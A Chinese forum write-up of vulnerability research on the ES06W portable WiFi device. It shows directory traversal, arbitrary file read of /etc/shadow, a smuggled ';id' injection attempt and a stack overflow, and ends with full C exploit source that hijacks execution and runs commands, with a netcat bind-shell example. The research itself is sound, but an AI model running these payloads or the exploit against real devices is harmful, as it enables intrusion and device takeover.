> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-273940.htm)

> [原创] 对一个随身 WIFI 设备的漏洞挖掘尝试

对一个随身 WIFI 设备的漏洞挖掘尝试
====================

最近买了一个随时 WIFI 设备，正好自己在学习漏洞挖掘，于是拿这个练练手。  
设备版本信息：

```
software_version = V4565R03C01S61
hardware_version = M2V1
product_model = ES06W
upgrade_version = V4565R03C01S61
```

首先扫描了下设备开放的端口。设备开放了 22、80、443、5555、8080、9090 等多个端口。SSH 爆破测试了下，密码不是弱密码没什么突破。  
![](https://bbs.pediy.com/upload/attach/202208/780653_ZMPTVK95XAJPCVG.png)  
443、9090 端口访问会返回 404，可能需要其他参数，没什么突破。  
![](https://bbs.pediy.com/upload/attach/202208/780653_GKQPA8RPB58VHWU.png)  
设备开放了 5555 调试端口，可以直接通过 adb 连接获取设备权限。继续查找有没有其可利用的点。访问 8080 端口默认跳转到了 http://192.168.0.1:8080/vad_update.html 页面。该页面提供了设备升级、日志下载和 APN 设置功能。  
![](https://bbs.pediy.com/upload/attach/202208/780653_BKDWDKPQYH333UR.png)

目录遍历漏洞
------

查看 BurpSuite 历史记录，发现 http://192.168.0.1/file_list.json?dir = 请求比较有意思，dir 指定目录，返回包返回了 json 格式的目录信息。  
![](https://bbs.pediy.com/upload/attach/202208/780653_WKW593F86SSFYSU.png)  
![](https://bbs.pediy.com/upload/attach/202208/780653_5MUUZN4HW2URB8H.png)  
尝试通过 dir 参数进行目录遍历，如 / file_list.json?dir=../../../../../，确认存在目录遍历漏洞。  
![](https://bbs.pediy.com/upload/attach/202208/780653_C8RQQ2MUNWQW3JT.png)

任意文件读取漏洞
--------

继续查看 BurpSuite 历史记录，发现 http://192.168.0.1/apns-conf.xml 请求也比较有意思，URI 指定了一个文件名，返回包是文件内容。  
![](https://bbs.pediy.com/upload/attach/202208/780653_9STESC875VX87N8.png)  
于是尝试通过 URI 进行目录遍历读取文件，确认存在任意文件读取漏洞。这时利用任意文件读取漏洞可以读取到 / etc/shadow 的 SSH 密码了，可以尝试破解密码后直接使用 SSH 登录。  
![](https://bbs.pediy.com/upload/attach/202208/780653_BHXPYRZ8SSKKP8Q.png)

寻找命令注入漏洞
--------

接下来准备把 HTTP 服务程序拿出来分析下。设备默认开启了 5555 端口，可以直接通过 adb 连接拿到设备权限。通过看看连接状态可以确定 / opt/ejoin/bin/vfd 就是 HTTP 服务程序。  
![](https://bbs.pediy.com/upload/attach/202208/780653_CKGFHEHUPZYYDHC.png)  
![](https://bbs.pediy.com/upload/attach/202208/780653_66JWPVE5XV6NFGQ.png)  
/opt/ejoin/bin/vfd 为 32 位 ARM 架构，定位到 HTTP 请求解析的代码进行分析。首先尝试寻找命令注入漏洞。但是发现 vfd 中没有 system、popen 函数，执行命令是调用的 sub_C1F4 函数。  
![](https://bbs.pediy.com/upload/attach/202208/780653_SFRVADDXN2C4XZK.png)  
sub_C1F4 函数内部调用 sub_12024 函数，sub_12024 函数内部通过调用 / opt/ejoin/var/pipe/vshd 程序传递参数执行命令。  
![](https://bbs.pediy.com/upload/attach/202208/780653_QG4Z6R54XVYY24P.png)  
于是查找引用 sub_12024 函数的地方，sub_12280 和 sub_12294 都不能控制参数，只有 sub_122A8 函数中参数似乎是可控的。sub_122A8 函数中将 a1 参数拼接到 “cd %s” 命令中执行。  
![](https://bbs.pediy.com/upload/attach/202208/780653_VBPWH7YNUXC55E3.png)  
![](https://bbs.pediy.com/upload/attach/202208/780653_KUBYYYFFFERZTA6.png)  
继续查找引用 sub_122A8 函数的地方，发现只有一个地址。通过调式信息来看，传递给 sub_122A8 函数的 a1 参数为一个目录。  
![](https://bbs.pediy.com/upload/attach/202208/780653_EJQ4P356Y5V7EPU.png)  
继续查找交叉引用，最终发现目录来自 http://192.168.0.1/Uplog.html 请求的 filename 参数。  
![](https://bbs.pediy.com/upload/attach/202208/780653_V6WMSKV9JNSVDQQ.png)  
![](https://bbs.pediy.com/upload/attach/202208/780653_E36E7XF4YF4XB57.png)  
于是构造下列请求 http://192.168.0.1:8080/uplog.html?filename=/etc/passwd&fileurl=123 进行测试，正好 WEB 页面可以下载 vfd 日志，从日志中看出，vfd 将 filename 指定的路径分割出目录和文件名，并切换到相应的目录并压缩文件。  
![](https://bbs.pediy.com/upload/attach/202208/780653_T8A4KHVMUBCPEG6.png)  
尝试构造 http://192.168.0.1:8080/uplog.html?filename=/etc/;id/../../../etc/passwd&fileurl=123 请求进行测试，发现代码中会对 filename 指向的文件是否存在进行判断，暂时没法绕过进行命令注入。  
![](https://bbs.pediy.com/upload/attach/202208/780653_KKPGZ9UJFQ6TJJ9.png)

尝试找栈溢出漏洞
--------

于是尝试查找 vfd 解析请求的代码中的栈溢出漏洞。发现解析 http://192.168.0.1/file_list.json?dir = 请求时，sub_EE48 函数会将 dir 参数的内容拼接到栈空间 s 中，s 只有 256 字节大小，这里存在一个栈溢出漏洞。  
![](https://bbs.pediy.com/upload/attach/202208/780653_6V78V4H5PPMQ9RG.png)  
继续查找发现 sub_D7A8 函数在解析读取文件的请求时，直接将 URI 拷贝到栈空间 s，s 只有 280 字节大小，也存在栈溢出漏洞。  
![](https://bbs.pediy.com/upload/attach/202208/780653_75AHEPE5CXY4USX.png)

栈溢出漏洞利用
-------

这里尝试对 sub_D7A8 函数中的栈溢出漏洞进行利用。adb 连接设备后通过 gdb 调式 vfd 程序。构造如下 POC 发送：

```
http://192.168.0.1:8080/aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazaAaBaCaDaEaFaGaHaIaJaKaLaMaNaOaPaQaRaSaTaUaVaWaXaYaZa0a1a2a3a4a5a6a7a8a9babbbcbdbebfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzbAbBbCbDbEbFbGbHbIbJbKbLbMbNbObPbQbRbSbTbUbVbWbXbYbZb0b1b2b3b4b5b6b7b8b9cacbcccdcecfcgchcicjckclcmcncocpcqcrcsctcucvcwcxcycz
```

根据 PC 寄存器地址定位到要覆盖的返回地址偏移为 261。  
![](https://bbs.pediy.com/upload/attach/202208/780653_JTSDYKP8NRJWG2P.png)  
修改 POC 如下，就可以将 PC 寄存器劫持为指定的地址了。

```
http://192.168.0.1:8080/aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazaAaBaCaDaEaFaGaHaIaJaKaLaMaNaOaPaQaRaSaTaUaVaWaXaYaZa0a1a2a3a4a5a6a7a8a9babbbcbdbebfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzbAbBbCbDbEbFbGbHbIbJbKbLbMbNbObPbQbRbSbTbUbVbWbXbYbZb0b1b2b3b4b5b6b7b8b9cacbcccdc123DDDD
```

![](https://bbs.pediy.com/upload/attach/202208/780653_4VG2Z2KG8UXZHC8.png)  
漏洞函数在返回时执行 POP {R4-R7,PC}，因此 R4-R7 寄存器也是可以控制的。  
![](https://bbs.pediy.com/upload/attach/202208/780653_H339SFGHKBPZX9K.png)  
系统没有随机基址，漏洞利用较为简单，只需要避免字符串截断就行。因此直接从 libc 库中查找到 MOV R0,SP; LDR R2,[R7]; BLX R2; 指令的地址 0x48d50294 用来覆盖返回地址。  
![](https://bbs.pediy.com/upload/attach/202208/780653_PMQZ4HKZAWGH9R3.png)  
漏洞函数返回后，SP 指向覆盖的返回地址后面，就可以通过 URL 的内容来控制 R0 寄存器指向的字符串。R2 寄存器可以用 R7 来控制。Libc 中 system 函数地址为 0x48CEA830。找到一个指向 system 函数地址的指针 0x48CB5FBC 来控制 R7 寄存器。  
![](https://bbs.pediy.com/upload/attach/202208/780653_S38P4M4WB987VM8.png)  
![](https://bbs.pediy.com/upload/attach/202208/780653_MK8Q3BJ4ZDC7PQ7.png)  
从新构造如下 POC 后调式：  
![](https://bbs.pediy.com/upload/attach/202208/780653_WNUTWSC8SHXX2KA.png)  
触发漏洞后执行到 0x48d50294 时，R7 为控制的 0x48CB5FBC。  
![](https://bbs.pediy.com/upload/attach/202208/780653_G8878FTRWGESDUN.png)  
此时 SP 指向用来覆盖返回地址的值后面，可以将要执行的命令拼接在 URL 末尾来执行命令。  
![](https://bbs.pediy.com/upload/attach/202208/780653_PV6EBG8QJ65PSDV.png)  
执行到 BLX R2 指令时，R2 就是 system 函数地址了。  
![](https://bbs.pediy.com/upload/attach/202208/780653_A8QW7MT9FWASTHG.png)  
测试 EXP：  
![](https://bbs.pediy.com/upload/attach/202208/780653_QWMPVHWRA3Z8WSP.png)  
EXP：

```
// ES06W-RCE.cpp :
//
#include "stdafx.h"
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include #include #pragma comment(lib, "ws2_32.lib")
 
void ShowHelp()
{
    printf("[+]Usage: ES06W-RCE.exe [Command]\n");
    printf("[+]Example: ES06W-RCE.exe \"nc${IFS}-lp${IFS}4444${IFS}-e${IFS}/bin/sh\"\n");
}
 
 
int main(int argc, char** argv)
{
    WSADATA stcData = {};
    int int_ret = 0;
    char str_recv[0x1000] = {};
    char str_payload_final[0x1000] = {};
 
    //
    if (argc != 2) {
        ShowHelp();
        return 0;
    }
    //
    int_ret = WSAStartup(MAKEWORD(2, 2), &stcData);
    if (int_ret == SOCKET_ERROR) {
        printf("[-]Init Failed!\n");
        return 0;
    }
    //
 
    char str_payload[] = {
        "GET /aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazaAaBaCaDaEaFaGaHa"
        "IaJaKaLaMaNaOaPaQaRaSaTaUaVaWaXaYaZa0a1a2a3a4a5a6a7a8a9babbbcbdbebfbgbhbib"
        "jbkblbmbnbobpbqbrbsbtbubvbwbxbybzbAbBbCbDbEbFbGbHbIbJbKbLbMbNbObPbQbRbSbTb"
        "UbVbWbXbYbZb0b1b2b3b4b5b6b7b8b9cacbcccd"
        "\xBC\x5F\xCB\x48"                    //Control R7
        "\x94\x02\xD5\x48"                    //Return Addr
        "%s"                                //Command
        " HTTP/1.1\r\n"       
        "Host: 192.168.0.1:8080\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Accept-Language: zh-CN,zh;q=0.9\r\n\r\n\0"
    };
 
    sprintf_s(str_payload_final, 0x1000, str_payload, argv[1]);
 
    //
    SOCKET sock_client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in sock_addr;
    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = htons(8080);
    sock_addr.sin_addr.S_un.S_addr = inet_addr("192.168.0.1");
    //
    int nErrCode = 0;
    int_ret = connect(sock_client, (sockaddr*)&sock_addr, sizeof(sockaddr_in));
    //
    send(sock_client, str_payload_final, strlen(str_payload_final), 0);
    //
    Sleep(20);
    recv(sock_client, str_recv, sizeof(str_recv), 0);
    printf("[-]Recv: %s\n", str_recv);
 
    printf("[+]Finished!\n");
    closesocket(sock_client);
    WSACleanup();
    //
    return 0;
} 
```

[[2022 夏季班]《安卓高级研修班 (网课)》月薪两万班招生中～](https://www.kanxue.com/book-section_list-83.htm)

[#安全研究](forum-128-1-167.htm) [#漏洞分析](forum-128-1-171.htm) [#漏洞挖掘](forum-128-1-178.htm) [#家用设备](forum-128-1-173.htm)